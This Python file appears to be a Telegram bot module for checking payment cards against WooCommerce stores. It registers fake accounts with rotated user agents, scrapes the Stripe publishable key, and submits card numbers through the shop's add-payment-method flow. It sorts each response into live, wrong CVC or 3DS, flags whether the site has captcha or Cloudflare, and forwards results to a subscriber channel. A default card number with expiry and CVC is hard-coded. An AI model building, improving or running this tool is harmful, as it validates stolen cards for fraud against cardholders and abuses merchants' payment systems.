import logging
import requests
import random
import string
import re
import html
import time
from fake_useragent import UserAgent
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes
from config import CHANNEL_ID
# --- CONFIG (no Telegram token needed) ---
DEFAULT_CARD = "4848100094874662|08|2029|337"

# ----------------

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

def html_escape(text: str) -> str:
    return html.escape(text) if text else ""

def generate_random_string(length=10) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email() -> str:
    return f"{generate_random_string()}@gmail.com"

def generate_random_username() -> str:
    return f"user_{generate_random_string(8)}"

# --- Replace or add these functions in sitechk.py ---

def get_base_url(user_url: str) -> str:
    from urllib.parse import urlparse, urlunparse
    parsed = urlparse(user_url if user_url.startswith(("http://", "https://")) else "https://" + user_url)
    return urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))


def analyze_site_page(text: str) -> dict:
    """
    Analyze HTML for gateways, captcha, Cloudflare, and add-to-cart hints.
    Returns a dict with keys: gateways (list), has_captcha (bool),
    has_cloudflare (bool), has_add_to_cart (bool).
    """
    low = text.lower()
    gateways = []
    for gw in ("stripe", "paypal", "ppcp","square", "braintree", "adyen", "paystack", "razorpay", "2checkout"):
        if gw in low:
            gateways.append(gw.capitalize())

    has_captcha = any(k in low for k in ("recaptcha", "g-recaptcha", "h-captcha", "captcha"))
    # Cloudflare detection: page title or body often contains "Attention Required!" or "Checking your browser"
    has_cloudflare = "cloudflare" in low or "attention required" in low or "checking your browser" in low
    # Add-to-cart detection: typical selectors / strings
    has_add_to_cart = any(k in low for k in ("add-to-cart", "woocommerce-loop-product__link", "product_type_simple", "add_to_cart_button"))

    return {
        "gateways": list(dict.fromkeys(gateways)),  # unique, preserve order
        "has_captcha": has_captcha,
        "has_cloudflare": has_cloudflare,
        "has_add_to_cart": has_add_to_cart,
    }
def register_new_account(register_url: str, session: requests.Session = None):
    """
    Registers a random account on the WooCommerce site.
    Returns a requests.Session with cookies if successful, or None if failed.
    """
    sess = session or requests.Session()
    headers = {
        "User-Agent": UserAgent().random,
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "email": generate_random_email(),
        "username": generate_random_username(),
        "password": generate_random_string(12)
    }

    try:
        resp = sess.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True)
        if resp.status_code in (200, 302):
            logger.info(f"[+] Registered new account: {data['email']} | {data['username']}")
            return sess
        else:
            logger.warning(f"[!] Registration failed ({resp.status_code}): {resp.text[:300]}")
            return None
    except Exception as e:
        logger.error(f"Exception during registration: {e}")
        return None


def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
    """
    Try multiple strategies to find a Stripe public key on the payment page.
    Uses the provided requests.Session if given (recommended so cookies/auth are preserved).
    Returns pk string or None.
    """
    sess = session or requests.Session()
    try:
        headers = {"User-Agent": UserAgent().random}
        resp = sess.get(payment_url, headers=headers, timeout=15)
        text = resp.text
    except Exception as e:
        logger.error(f"Error fetching payment page for PK discovery: {e}")
        return None

    # Analyze page
    page_info = analyze_site_page(text)

    # 1) Common direct PK patterns (pk_live_ or pk_test_)
    pk_match = re.search(r'pk_(live|test)_[0-9A-Za-z_\-]{8,}', text)
    if pk_match:
        pk = pk_match.group(0)
        logger.info(f"[PK] Found via pk_ regex: {pk[:24]}...")
        return pk

    # 2) Fallback: JSON-like "key" pattern, e.g. "key": "pk_live..."
    match_pk = re.search(r'"key"\s*:\s*"(pk_live|pk_test)_[^"]+"', text)
    if match_pk:
        pk_val = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]+', match_pk.group(0))
        if pk_val:
            pk = pk_val.group(0)
            logger.info(f"[PK] Found via JSON 'key' fallback: {pk[:24]}...")
            return pk

    # 3) publishableKey / publishable_key fallback
    match_pk2 = re.search(r'publishable[_-]?key["\']?\s*[:=]\s*["\'](pk_live|pk_test)_[^"\']+["\']', text, re.IGNORECASE)
    if match_pk2:
        pk_val = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]+', match_pk2.group(0))
        if pk_val:
            pk = pk_val.group(0)
            logger.info(f"[PK] Found via publishableKey fallback: {pk[:24]}...")
            return pk

    # 4) Loose search
    pk_loose = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]{8,}', text)
    if pk_loose:
        pk = pk_loose.group(0)
        logger.info(f"[PK] Found via loose pk pattern: {pk[:24]}...")
        return pk

    # 5) Final fallback rule: if Stripe not mentioned among detected gateways -> None
    if "stripe" not in ",".join(page_info["gateways"]).lower():
        logger.debug("Stripe not found among recognized gateway mentions; treating as no PK present.")
        return None

    logger.warning("Stripe mentioned but public key not found by heuristics.")
    return None


def interpret_gate_response(final_json: dict) -> tuple[str, str]:
    """
    Improved interpretation of gate JSON.
    Returns (status_key, short_message) where status_key in:
      "success", "cvc_incorrect", "3ds", "not_supported", "unknown"
    """
    # Defensive: ensure final_json is dict-like
    try:
        data = final_json or {}
    except Exception:
        data = {}

    # Convert full text for broad string checks
    txt = ""
    try:
        txt = str(final_json).lower()
    except Exception:
        txt = ""

    # 1) If the response contains nested 'data' with a 'status' - inspect that first.
    #    Many plugins return: { "success": True, "data": { "status": "requires_action", ... } }
    nested = data.get("data") if isinstance(data, dict) else None
    if isinstance(nested, dict):
        status = (nested.get("status") or "").lower()
        # If server created a SetupIntent/PaymentIntent which requires action -> 3DS
        if status in ("requires_action", "requires_source_action", "requires_payment_method", "requires_confirmation"):
            return "3ds", "3DS / additional authentication required."
        # If status explicitly indicates success/completed
        if status in ("succeeded", "complete", "completed", "processed"):
            return "success", "Card added (setup succeeded)."

        # If there's a next_action block, treat that as 3DS/extra auth
        if nested.get("next_action") or nested.get("next_action_type") or nested.get("next_action", {}).get("type"):
            return "3ds", "3DS / additional authentication required."

    # 2) Check for common Stripe SetupIntent / PaymentIntent shapes
    # e.g. {"setup_intent": {"status": "requires_action", ...}} or {"payment_intent": {...}}
    for key in ("setup_intent", "setupIntent", "payment_intent", "paymentIntent"):
        si = data.get(key) if isinstance(data, dict) else None
        if isinstance(si, dict):
            si_status = (si.get("status") or "").lower()
            if si_status in ("requires_action", "requires_source_action", "requires_confirmation"):
                return "3ds", "3DS / additional authentication required."
            if si_status in ("succeeded", "complete", "processed"):
                return "success", "Card added (setup succeeded)."

            # if a client_secret + next_action appears -> also 3DS
            if si.get("client_secret") and (si.get("next_action") or "3ds" in str(si).lower()):
                return "3ds", "3DS / additional authentication required."

    # 3) Explicit next_action at top-level
    if isinstance(data, dict) and (data.get("next_action") or "requires_action" in txt or "use_stripe_sdk" in txt or "3ds" in txt or "3d_secure" in txt):
        return "3ds", "3DS / additional authentication required."

    # 4) CVC / security code errors checks (keep high priority)
    if any(k in txt for k in ("security code is incorrect", "incorrect_cvc", "cvc_check", "cvc_failed", "cvc_invalid")):
        return "cvc_incorrect", "Your Card security code is incorrect."

    # 5) Unsupported / not allowed / cannot be used
    if any(k in txt for k in ("does not support", "not support", "unsupported", "cannot be used", "not allowed", "not permitted")):
        return "not_supported", "Your Card Does not support this type of purchase."

    # 6) Some responses include explicit flags like result/success but we must be careful:
    #    Only treat as true success if nested evidence suggests success (setup_intent/payment_intent status succeeded)
    #    If there's a top-level success True but no nested status, treat as unknown instead of success.
    if isinstance(data, dict) and ("success" in data):
        # success exists; check if it's truthy and whether we have any nested status that says succeeded
        if data.get("success") in (True, "true", "1", 1):
            # if earlier nested checks didn't already return success/3ds, be conservative:
            # - prefer unknown rather than assuming card added
            return "unknown", "Request accepted but no final status — may require additional action."

    # 7) Card declined (generic)
    if "card_declined" in txt or "declined" in txt:
        if "cvc" in txt or "security code" in txt:
            return "cvc_incorrect", "Card security code is incorrect."
        return "unknown", "Your Card was declined."

    # 8) Fallback: if we see clear success words anywhere
    if any(k in txt for k in ("succeeded", "setup_intent succeeded", "setup succeeded", "payment_intent.succeeded")):
        return "success", "Your Card added (success)."

    # 9) Default unknown - return a readable snippet
    return "unknown", (str(final_json)[:1000] if final_json else "No response")



# Modified send_card_to_stripe to return both raw JSON and the interpreted status
def send_card_to_stripe(session: requests.Session, pk: str, card: str):
    """
    Core gate logic — adapted from gatet.Tele but parameterized to accept pk and session.
    Returns the final JSON from the site's create_and_confirm_setup_intent (the gate response).
    """
    try:
        n, mm, yy, cvc = card.strip().split("|")
    except Exception:
        return {"error": "Invalid card format. Expected: number|mm|yyyy|cvc"}

    if yy.startswith("20"):
        yy = yy[2:]

    headers = {"User-Agent": UserAgent().random, "Referer": ""}  # referer set later when known

    # 1) Create payment method on Stripe
    stripe_payload = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "key": pk,
        "_stripe_version": "2024-06-20"
    }
    logger.debug("[DEBUG] Sending card data to Stripe API")
    resp = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, headers=headers, timeout=15)
    try:
        stripe_json = resp.json()
    except Exception as e:
        logger.error(f"[DEBUG ERROR] Stripe response not JSON: {e} / {resp.text[:300]}")
        return {"error": "Stripe response not JSON", "raw": resp.text[:800]}

    stripe_id = stripe_json.get("id")
    if not stripe_id:
        # include the stripe response to help classify the failure
        return {"error": "Failed to retrieve Stripe payment_method ID", "stripe_resp": stripe_json}

    # 2) Get nonce from payment page (must fetch full payment_url page so referer and cookies align)
    logger.debug("[DEBUG] Retrieving nonce from payment page HTML")
    try:
        html_text = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
    except Exception as e:
        return {"error": "Failed to fetch payment page for nonce", "raw": str(e)}

    # Try several nonce patterns
    nonce = None
    for pattern in (r'createAndConfirmSetupIntentNonce":"([^"]+)"', r'"_ajax_nonce":"([^"]+)"', r'nonce":"([^"]+)"'):
        m = re.search(pattern, html_text)
        if m:
            nonce = m.group(1)
            break
    if not nonce:
        logger.error("[DEBUG ERROR] Nonce not found in payment page")
        return {"error": "Nonce not found on payment page", "sample_html": html_text[:1000]}

    # 3) Build final request to create and confirm setup intent for this site
    data_final = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': stripe_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    payment_intent_url = session.payment_page_url.replace('/add-payment-method/', '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent')
    logger.debug(f"[DEBUG] Sending final request to {payment_intent_url}")
    final_resp = session.post(payment_intent_url, headers={"User-Agent": UserAgent().random, "Referer": session.payment_page_url}, data=data_final, timeout=25)

    try:
        final_json = final_resp.json()
    except Exception:
        logger.error(f"[DEBUG ERROR] Final response not JSON: {final_resp.text[:500]}")
        return {"error": "Final response not JSON", "raw": final_resp.text[:800]}

    logger.debug(f"[DEBUG] Final gate response: {final_json}")

    # Interpret response into category + message
    status_key, short_msg = interpret_gate_response(final_json)

    # Normalize structure returned so caller can format final message
    return {
        "raw": final_json,
        "status_key": status_key,
        "short_msg": short_msg,
        "stripe_payment_method": stripe_id,
    }


# Updated check_command that uses base url and builds the final result block
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /check <site> [card]")
        return

    site_input = context.args[0].rstrip("/")
    base = get_base_url(site_input)
    card = context.args[1] if len(context.args) > 1 else DEFAULT_CARD

    # 🧭 Start the single editable message
    progress_msg = await update.message.reply_text(
        f"🔍 Checking site: <code>{html_escape(base)}</code>",
        parse_mode=ParseMode.HTML
    )

    try:
        # Step 1: Check if site reachable
        start_time = time.time()
        r = requests.get(base, headers={"User-Agent": UserAgent().random}, timeout=15)
        response_time = time.time() - start_time
        if r.status_code >= 400:
            await progress_msg.edit_text(f"❌ Failed fetching {html_escape(base)} (status {r.status_code})", parse_mode=ParseMode.HTML)
            return

        await progress_msg.edit_text(f"✅ Site reachable ({response_time:.2f}s)\nAnalyzing...", parse_mode=ParseMode.HTML)

        # Step 2: Register account
        session = register_new_account(base + "/my-account/")
        if not session:
            await progress_msg.edit_text("❌ Account registration failed.", parse_mode=ParseMode.HTML)
            return
        session.payment_page_url = base + "/my-account/add-payment-method/"

        # Step 3: Fetch payment page
        await progress_msg.edit_text(" Payment gateways...", parse_mode=ParseMode.HTML)
        page_html = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
        page_info = analyze_site_page(page_html)

        # Step 4: Find PK
        await progress_msg.edit_text("🔑 Searching for Stripe PK...", parse_mode=ParseMode.HTML)
        pk_raw = find_pk(session.payment_page_url, session)
        if not pk_raw:
            await progress_msg.edit_text("❌ PK not found.", parse_mode=ParseMode.HTML)
            return

        # Step 5: Send card to Stripe
        await progress_msg.edit_text(f"PK:\n<code>{html_escape(pk_raw)}</code>\nAdding card...", parse_mode=ParseMode.HTML)
        result = send_card_to_stripe(session, pk_raw, card)

        # Step 6: Interpret result
        status_key = result.get("status_key", "unknown")
        short_msg = result.get("short_msg", "")
        raw_snip = html_escape(str(result.get("raw", ""))[:800])

        status_label = {
            "success": "✅ Card added",
            "cvc_incorrect": "⚠️ Incorrect CVC",
            "3ds": "⚠️ 3DS required",
            "not_supported": "⛔ Not supported",
        }.get(status_key, "❌ Card declined")

        gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"
        captcha = "Found❌" if page_info["has_captcha"] else "Good site✅"
        cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good site✅"
        add_to_cart = "Yes" if page_info["has_add_to_cart"] else "No"

        # Step 7: Final unified message
        final_msg = (
            f"<b>Site:</b> <code>{html_escape(base)}</code>\n"
            f"<b>Gateway:</b> {gateway}\n"
            f"<b>Captcha:</b> {captcha}\n"
            f"<b>Cloudflare:</b> {cloudflare}\n"
            f"<b>Add to cart:</b> {add_to_cart}\n"
            f"<b>PK:</b> <code>{html_escape(pk_raw)}</code>\n\n"
            f"<b>Site response:</b> {short_msg}\n"
            f"<code>{raw_snip}</code>"
        )
        # ✅ Edit the final message for the user
        await progress_msg.edit_text(final_msg, parse_mode=ParseMode.HTML)

        # ✅ Forward to main subscribers (robust + compatible version)
        try:
            bot_instance = None

            # Safely detect or recover the bot instance
            if hasattr(context, "bot") and context.bot:
                bot_instance = context.bot
            elif hasattr(update, "get_bot"):
                bot_instance = update.get_bot()
            elif hasattr(update, "_bot"):
                bot_instance = update._bot
            elif hasattr(update, "message") and hasattr(update.message, "bot"):
                bot_instance = update.message.bot

            # 🧩 Fallback: import global bot from main.py (for manual/test calls)
            if bot_instance is None:
                try:
                    from main import bot
                    bot_instance = bot
                except Exception:
                    logger.warning("[Forward Error] Could not import global bot instance from main.py.")

            # ✅ Only forward if a bot instance is found
            if bot_instance:
                bot_instance.send_message(
                    CHANNEL_ID,
                    final_msg,
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
                logger.info("[Forward] Message successfully forwarded to subscribers.")
            else:
                logger.warning("[Forward Error] No valid bot instance detected for forwarding.")

        except Exception as e:
            logger.warning(f"[Forward Error] {e}")


    except Exception as e:
        await progress_msg.edit_text(
            f"❌ Error: {html_escape(str(e))}",
            parse_mode=ParseMode.HTML
        )
